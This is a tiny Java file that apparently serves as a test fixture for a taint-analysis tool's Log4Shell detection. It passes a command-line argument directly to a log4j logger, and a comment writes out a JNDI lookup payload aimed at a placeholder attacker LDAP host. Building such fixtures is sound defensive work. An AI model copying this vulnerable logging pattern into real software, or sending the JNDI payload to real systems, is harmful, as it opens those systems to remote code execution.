package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Bare main() — args[0] is the most direct attacker-controlled taint
 * source possible.  No framework, no DI, no controllers.  If sprint #3
 * cannot detect Log4Shell here, basic symbol resolution is broken.
 */
public class Main {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(Main.class);
        // args[0] from the command line — could be ${jndi:ldap://attacker/x}
        logger.error(args[0]);
    }
}
